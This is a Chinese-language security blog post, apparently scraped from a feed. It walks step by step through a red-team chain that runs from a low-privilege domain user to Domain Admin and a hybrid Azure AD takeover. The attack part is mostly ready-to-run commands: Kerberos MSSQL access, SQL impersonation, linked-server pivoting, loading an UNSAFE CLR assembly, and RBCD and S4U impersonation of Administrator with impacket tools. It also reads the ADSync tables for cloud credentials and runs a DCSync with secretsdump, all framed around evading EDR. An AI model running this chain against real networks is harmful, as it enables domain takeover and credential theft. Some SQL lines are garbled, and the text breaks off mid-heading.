---
title: 从 MSSQL 到域管理员：混合 Active Directory 中的无文件横向移动
url: https://mp.weixin.qq.com/s/yh2MYxQu6A_XTdz2it1dZw
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:21:28.811132
---

# 从 MSSQL 到域管理员：混合 Active Directory 中的无文件横向移动

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnuzicp13KtABo9ZdWjbvr974FbYJ8lmcbiaiagzRsrhalOb14bd8oOutJ6v6sT4fRrOl5cv3nDmoq9leib7etgKJmoqrhREeWE59AM/0?wx_fmt=jpeg)

# 从 MSSQL 到域管理员：混合 Active Directory 中的无文件横向移动

haidragon
haidragon

安全狗的自我修养

![]()

在小说阅读器中沉浸阅读

# 官网：http://securitytech.cc

##

## Overview

## 概述

在成熟的企业环境中，传统基于 payload 的横向移动方式风险极高。EDR 解决方案会重点监控：

* 可疑的子进程
* 对 LSASS 的访问
* PowerShell 滥用
* 服务创建
* 远程执行工具

本案例展示了一名红队成员如何从一个被攻破的低权限用户，逐步获取 Domain Admin 权限——并最终掌控混合身份体系，仅使用：

* 原生 SQL 功能
* Kerberos 委派滥用
* 身份配置错误
* 跨林信任关系
* Azure AD Connect 暴露点

没有投放恶意软件。
没有执行凭证转储工具。
没有利用明显漏洞。

整条攻击链完全基于信任关系与身份架构设计缺陷。

---

## Engagement Scenario

## 攻击演练场景

### Environment

### 环境结构

* 1200 用户企业
* corp.local 林
* dev.local 林（双向信任）
* Azure AD 通过 Azure AD Connect 进行混合同步
* MSSQL 集群运行 ERP 与报表系统
* SQL 服务账户为域账户
* 启用 Defender 与日志记录
* 开启 PowerShell Script Block Logging

### Initial Access

### 初始访问

* 获取低权限域用户有效凭证
* 无本地管理员权限
* 无域管理员权限

### Objective

### 目标

> 在不部署恶意软件的前提下获取 Domain Admin 权限，并评估混合身份暴露面。

---

![https://d1tzxux72fvryy.cloudfront.net/Me97f216a9320265a7e7c14d5dc25e4e01726204849454/preview/Me97f216a9320265a7e7c14d5dc25e4e01726204849454.png](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnuzgRsFmhIYCJltGUDUEU7TOxtbMWIRyZYtvyhEedVoBN9ufwO4vuTQBfYLGia6wM2LEuqBMTdTVGPgZ5zky1LVxQjaSlgCJDkY/640?wx_fmt=png&from=appmsg)

![https://learn.microsoft.com/en-us/entra/identity/domain-services/media/concepts-forest-trust/kerberos-over-forest-trust-process-diagram.png](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuyGKW8xiaBicYYAdbhQE0Go6QjMn7tIb2TItvlWWJpuTnD2hJGBRoPsoq07woPIpbBp6iagahQ3lmW7VZ1CX5uicoYU9rhfUhc2JM/640?wx_fmt=png&from=appmsg)

![https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/media/tshoot-connect-attribute-not-syncing/tshoot-connect-attribute-not-syncing/syncingprocess.png](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBnt167he1ZZ2QPqVSzeS7MFYCtFIhZ5RhbM4P97ZnwcCyecXcAjsm9uMA7UiahicvHUfeeVoJ1JXoTugtOj0SpnKQCgKyvCFLsl5E/640?wx_fmt=png&from=appmsg)

4

**Enterprise Hybrid Architecture
企业混合架构**

---

## Phase 1: MSSQL Recon via Kerberos

## 阶段 1：通过 Kerberos 进行 MSSQL 侦察

使用 Kerberos 认证而不是密码攻击：

```
mssqlclient.py corp.local/user@sql01.corp.local -k -no-pass
```

特点：

* 使用已有 TGT
* 避免生成新的认证日志
* 与正常企业流量高度相似

枚举 SQL 安全上下文：

```
SELECTSYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

结果：
用户不是 sysadmin，但拥有 SQL 登录权限。

---

## Phase 2: SQL Impersonation Escalation

## 阶段 2：SQL 模拟提权

枚举模拟权限路径：

```
SELECT
sp.name AS Grantor,
dp.name AS Grantee
FROM sys.server_permissions perm
JOIN sys.server_principals sp
ON perm.grantor_principal_id = sp.principal_id
JOIN sys.server_principals dp
ON perm.grantee_principal_id = dp.principal_id
WHERE perm.permission_name ='IMPERSONATE';
```

结果：

应用登录账户对 SQL 服务账户拥有 IMPERSONATE 权限。

执行：

```
EXECUTE AS LOGIN = 'sqlsvc';
SELECT SYSTEM_USER;
```

现在在 SQL 上下文中以域服务账户身份运行。
不会产生 Windows 登录事件。

---

## Phase 3: Linked Server Multi-Hop Pivot

## 阶段 3：Linked Server 多跳横向移动

枚举链接服务器：

```
EXEC sp_linkedservers;
```

发现：

* SQL02（报表服务器）
* SQLSYNC（混合同步后端）

启用 RPC：

```
EXEC sp_serveroption 'SQL02','rpc out','true';
```

远程执行：

```
EXEC ('SELECT SYSTEM_USER') AT SQL02;
```

横向移动完全发生在 SQL 协议内部。
不使用 SMB、WMI 或远程工具。

---

![https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/media/linked-servers-database-engine/configuration.png?view=sql-server-ver17](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuxbDSNd7XbrYOIKGPGCNGp7RhDHOaEjCicETRUy6zSZXjaGGgC2qDBbyaMht1UhQViciaTdq1OKiccWbibYpEcORNWqe88SV6fcvvw/640?wx_fmt=png&from=appmsg)

![https://www.cdata.com/solutions/linkedserver/_img/diagram.webp](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBntjoImV2fdf9QLZSgukIo5suHrvp855F3n3QLtPprOrd9jLBtASaMLDKpafukcdGriazmK0S2HHF7o0zh01a4e0KCQ380aME3AQ/640?wx_fmt=other&from=appmsg)

![https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AnYMlxeOnMez51JeNlNSKvw.png](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnu8LWokN5MNHKJZwgLkKL5kUibMibBzfCPXqW8IViaVsFY2f7Y5pAsgnVw1RdoW2ITv7V3jQibzqna1jFd2N7gxgOw4ibZaqkQYYibd4/640?wx_fmt=png&from=appmsg)

4

**MSSQL Impersonation & Linked Server**

---

## Phase 4: Fileless SQL CLR Assembly Abuse

## 阶段 4：无文件 SQL CLR 组件滥用

成熟环境通常监控 `xp_cmdshell`。
因此使用 CLR。

启用 CLR：

```
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
```

加载内存中的 .NET 程序集：

```
CREATE ASSEMBLY StealthAssembly
FROM0x4D5A90...
WITH PERMISSION_SET = UNSAFE;
```

创建过程：

```
CREATEPROCEDURE ExecPayload
ASEXTERNAL NAME StealthAssembly.[Namespace.Class].Method;
```

执行：

```
EXEC ExecPayload;
```

Payload 执行：

* 令牌上下文枚举
* Kerberos 票据提取
* 委派检查

无子进程生成。
无 PowerShell。
执行发生在 sqlservr.exe 内部。

---

**Fileless SQL CLR Execution**

---

## Phase 5–6: Delegation & RBCD

## 阶段 5–6：委派与 RBCD

LDAP 枚举发现：

* SQL 服务账户存在受限委派
* 委派目标为 CIFS 和 MSSQL
* MachineAccountQuota = 10

创建机器账户：

```
addcomputer.py corp.local/user:pass \
-computer-name SQLPIVOT$ \
-computer-pass Passw0rd!
```

写入 RBCD：

```
rbcd.py corp.local/user:pass \
-action write \
-delegate-from SQLPIVOT$ \
-delegate-to FILESERVER$
```

执行 S4U：

```
getST.py corp.local/SQLPIVOT$ \
-spn cifs/fileserver.corp.local \
-impersonate Administrator
```

获得管理员 Kerberos 票据。
无需密码。
无需内存转储。

---

## Phase 7: Cross-Forest Trust Pivot

## 阶段 7：跨林信任横向移动

corp.local 与 dev.local 存在双向信任。

* SID 过滤配置不当
* 可跨林使用 S4U
* 控制范围扩展到第二个林

---

![https://learn.microsoft.com/en-us/entra/identity/domain-services/media/concepts-forest-trust/kerberos-over-forest-trust-process-diagram.png](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuiatT5yEYWwfibwCDRrdZ7Z52AuRpp3Egiavz13CVj2ud7yVdFp71kZIeAuwxXQ9HEmdK6D5XNQOMJMYiccGTMQfct5JZo182WjdI/640?wx_fmt=png&from=appmsg)

![https://learn-attachment.microsoft.com/api/attachments/270040-windows-pki.png?platform=QnA](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnufgK7U7ZsFWibGKAqreBun6ibpvQPxrDSmWpxjOBUK5icvq76MHsJIkujQ6CJBaqZc3hyV93OzicyNU6ow7gHJxkDl85FapZjz9PY/640?wx_fmt=png&from=appmsg)

![https://miro.medium.com/v2/resize%3Afit%3A1024/0%2AgUBEFVsfluURDEgJ.png](https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBns1bic7940gdWybN3ia5rSZ8oHNeV89I6MQUWDicru2qHTPrickfT4VU3VtLiazibzibs0guncVz0M4q0EQ0geCI9y6D0L88v5ofPIs6w/640?wx_fmt=png&from=appmsg)

4

**Cross Forest Trust Pivot**

---

## Phase 8: Azure AD Connect Pivot

## 阶段 8：Azure AD Connect 横向移动

枚举数据库：

```
SELECT name FROM sys.databases;
```

发现：

* ADSync

查询配置表：

```
SELECT*FROM ADSync.dbo.mms_server_configuration;
```

获取 MSOL 凭证后可实现：

* Azure Global Admin
* 角色篡改
* 云后门账户创建

实现：

On-Prem AD → Azue AD → 同步控制链掌控

---

![https://learn.microsoft.com/en-us/azure/architecture/reference-architectures/identity/images/azure-active-directory.svg](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM4eyzHqlRpZ6icXzuPYeMIPcDAsyKX8Q27DvVq21ZgdIsg73ueBxNAicu4hgrJ8vNicdngeOajrOwHs6sMM1hUcJv7xzB5CwNgQoOQpfcJFfkskQ/640?wx_fmt=svg&from=appmsg)

![https://logpoint.com/hubfs/Imported_Blog_Media/azure-ad-blog-2-3-1.png?hsLang=en](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnuxdl0v4ibHwznVl5b5Cu21oHZtw0HT4eH96iatCQv7ARcBPWpEcDa4vMmlTosugf3EKJibjuBb83bmZLiaYf5vOT9HB8YhB2WQ1ZY/640?wx_fmt=png&from=appmsg)

**Azure AD Connect Hybrid Takeover**

---

## Phase 9: Domain Replication Abuse

## 阶段 9：域复制滥用

```
secretsdump.py -just-dc corp.local/admin@dc.corp.local
```

执行 DCSync：

* 无交互登录
* 无 RDP
* 无进程注入
* 纯目录复制协议

获得域管理员权限。

---

## Complete Attack Chain

## 完整攻击链

1. 低权限域用户
2. Kerberos MSSQL 访问
3. SQL 模拟
4. Linked Server 横向移动
5. 无文件 CLR 执行
6. 委派枚举
7. 创建机器账户
8. RBCD 配置
9. S4U 滥用
10. 跨林横向移动
11. Azure AD Connect 攻破
12. DCSync
13. 域 + 混合管理员权限

---

![https://www.varonis.com/hs-fs/hubfs/Imported_Blog_Media/KC-bgadd.png?height=1000&name=KC-bgadd.png&width=1500](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntTHWPeyl54KuNRy4r1WEdI4RdMwLZtN2zrMsj8omCCL3MG4Amwmx4uBlgq2XhQgmTCL3iaXFb4NfwkV4KiaJbKGx1TaULO1r03M/640?wx_fmt=png&from=appmsg)

![https://miro.medium.com/v2/resize%3Afit%3A1200/1%2AZHQoCbCMkfYbUlp03z9e8g.png](https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntYYUaibnBIvOM0rQRdm40ib8t3bReI3Gad6PiageT4z77FiciadUwb3ARRldAxib6yuf4icrw2IUsPiaO3azwITyicbsibt05JBWJ93rbLc/640?wx_fmt=png&from=appmsg)

4

**Fu...